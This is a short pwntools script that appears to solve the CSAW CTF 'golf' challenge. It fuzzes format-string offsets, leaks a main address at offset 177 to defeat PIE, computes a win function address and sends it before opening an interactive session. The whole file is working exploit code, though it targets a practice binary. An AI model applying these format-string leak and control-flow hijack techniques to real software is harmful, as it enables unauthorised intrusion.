from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

'''
## fuzz ##
context.log_level = 'error'
for i in range(200):
    p = process("./golf")
    payload = f"%{i}$p".encode()
    p.sendlineafter(b'? ', payload)
    info_leak = p.recvline()
    print(f"{i}: {info_leak}")

# main = 00101223 || main with pie = .....223
# see that it is at 177 (0x55e3d1ba0223\n')
'''

p = process("./golf")
#p = remote("golfing.ctf.csaw.io", 9999)

p.sendlineafter(b'? ', b'%177$p')

p.recvuntil("hello:")
leak = p.recvline()
main_leak = int(leak[:-1], 16) # dont want the \n

pie = main_leak - 0x101223 # addr from main in ghidra
win = hex(pie + 0x101209) # addr from win in ghidra

p.sendlineafter(b'!:', win[2:])

p.interactive()
